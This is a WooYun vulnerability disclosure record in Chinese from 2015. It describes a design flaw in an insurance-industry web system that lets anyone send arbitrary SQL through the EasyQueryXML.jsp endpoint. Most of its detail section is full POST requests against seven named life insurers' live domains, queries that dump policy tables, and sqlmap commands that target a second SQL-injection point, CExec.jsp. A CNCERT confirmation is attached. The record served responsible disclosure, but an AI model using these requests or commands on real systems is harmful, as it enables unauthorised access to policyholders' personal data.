{"id": 27158, "wybug_id": "wooyun-2015-0120530", "wybug_title": "某保险行业通用系统设计缺陷可直接操作数据库获取敏感数据（影响众多人寿保险）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "茜茜公主", "wybug_date": "2015-06-15 10:46", "wybug_open_date": "2015-09-17 17:28", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向公众公开  简要描述： I know ，I need a lightning to upgrade ，I need help! 详细说明：  前些时候提了一个华夏保险的漏洞 WooYun: 看我如何在前台任意操作华夏人寿保险某系统数据库 \n\n当时没有仔细的去分析数据包，所以在之后寻找其它案例的过程中，访问问题链接后直接跳转到登录页时，令我相当气馁。比如访问：农银人寿的漏洞页面http://remotebak.abchinalife.cn:7060/ui/common/easyQueryVer3/EasyQueryXML.jsp时，会跳转到http://remotebak.abchinalife.cn:7060/ui/indexlis.jsp让我误以为程序已经做了权限控制。经过多次测试后我发现，可以用POST方式直接提交，然后，你就可以直接操作该系统的数据库了（增删改查）\nPOST http://remotebak.abchinalife.cn:7060/ui/common/easyQueryVer3/EasyQueryXML.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://remotebak.abchinalife.cn:7060/ui/indexlis.jspContent-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Host: remotebak.abchinalife.cn:7060Content-Length: 48Connection: Keep-AlivePragma: no-cacheCookie: strSql=select+*+from+tabs&strStart=1&LargeFlag=0\n\n\n\nselect count(*) from LCCONT\n\n\n\n\n\n\n   漏洞证明：  其它几个案例\n国华人寿http://broker.guohualife.com/common/easyQueryVer3/EasyQueryXML.jsp\n\nPOST http://broker.guohualife.com/common/easyQueryVer3/EasyQueryXML.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://broker.guohualife.com/indexlis.jspContent-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Host: broker.guohualife.comContent-Length: 48Connection: Keep-AlivePragma: no-cacheCookie: strSql=select+*+from+tabs&strStart=1&LargeFlag=0\n\n\n2000多张表...\n\n随便来张表\nselect count(*) from ATS_REC_TRANSACTIONS\n\n\n取前10行\n\n\n华夏人寿http://gdxt.hxlife.com/ui/common/easyQueryVer3/EasyQueryXML.jsp\n\nPOST http://gdxt.hxlife.com/ui/common/easyQueryVer3/EasyQueryXML.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://gdxt.hxlife.com/ui/indexlis.jspContent-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Host: gdxt.hxlife.comContent-Length: 48Connection: Keep-AlivePragma: no-cacheCookie: strSql=select+*+from+tabs&strStart=1&LargeFlag=0\n\n\n取前10行select * from qlccont where rownum <11\n\n\n天安人寿http://epos.tianan-life.com/common/easyQueryVer3/EasyQueryXML.jsp\n\nPOST http://epos.tianan-life.com/common/easyQueryVer3/EasyQueryXML.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://epos.tianan-life.com/indexlis.jspContent-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Host: epos.tianan-life.comContent-Length: 48Connection: Keep-AlivePragma: no-cacheCookie: strSql=select+*+from+tabs&strStart=1&LargeFlag=0\nselect count(*) from SLCCONT\n\n取前10条数据select * from SLCCONT where rownum <11\n\n\n君龙人寿团险客户服务平台http://gecss.kdlins.com.cn:8081/gecss/common/easyQueryVer3/EasyQueryXML.jsp\n\nPOST http://gecss.kdlins.com.cn:8081/gecss/common/easyQueryVer3/EasyQueryXML.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://gecss.kdlins.com.cn:8081/gecss/indexlis.jspContent-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Host: gecss.kdlins.com.cn:8081Content-Length: 48Connection: Keep-AlivePragma: no-cacheCookie: LargeFlag=0&strStart=1&strSql=select+*+from+tabs\n\n\n\n\n\n君龙人寿短期险出单系统http://zhongjie.kdlins.com.cn:8080/kdlins/common/easyQueryVer3/EasyQueryXML.jsp\n\nPOST http://zhongjie.kdlins.com.cn:8080/kdlins/common/easyQueryVer3/EasyQueryXML.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://zhongjie.kdlins.com.cn:8080/kdlins/indexlis.jspContent-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Host: zhongjie.kdlins.com.cn:8080Content-Length: 48Connection: Keep-AlivePragma: no-cacheCookie: strSql=select+*+from+tabs&strStart=1&LargeFlag=0\n\n\n\n吉祥人寿http://epos.jxlife.com.cn/ter/common/easyQueryVer3/EasyQueryXML.jsp\n\nPOST http://epos.jxlife.com.cn/ter/common/easyQueryVer3/EasyQueryXML.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://epos.jxlife.com.cn/ter/indexlis.jspContent-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Host: epos.jxlife.com.cnContent-Length: 48Connection: Keep-AlivePragma: no-cacheCookie: strSql=select+*+from+tabs&strStart=1&LargeFlag=0\n\n\n\n\nselect * from SLCPOL where rownum <11\n\n该套建站程序，还有一处通用型sql注入,这里一起提出来（有些站被waf拦了）注入点在/common/cvar/CExec.jsp在浏览登录页时，系统会加载存在漏洞的jsp文件详细可查看 WooYun: 农银人寿某系统一个不起眼的页面引发的SQL注射 \npython SQLMap/SQLMap.py -u \"http://broker.guohualife.com/common/cvar/CExec.jsp\" --data \"txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=328044&txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044\" -p txtCodeCondition --risk 3 --level 3 --current-db\n\n\n\npython SQLMap/SQLMap.py -u \"http://epos.jxlife.com.cn/ter/common/cvar/CExec.jsp\" --data \"txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=328044&txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044\" -p txtCodeCondition --risk 3 --level 3 --current-db\n\n\n\npython SQLMap/SQLMap.py -u \"http://remotebak.abchinalife.cn:7060/ui/common/cvar/CExec.jsp\" --data \"txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=328044&txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044\" -p txtCodeCondition --risk 3 --level 3 --current-db\n\n\n\npython SQLMap/SQLMap.py -u \"http://gdxt.hxlife.com/ui/common/cvar/CExec.jsp\" --data \"txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=328044&txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044\" -p txtCodeCondition --risk 3 --level 3 --current-db\n\n\n   修复方案：  咨询中科软   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-06-19 17:28 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向保险行业信息化主管部门通报,由其后续协调网站管理单位处置. 已经由CNVD通过网站公开联系方式向软件生产厂商通报。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}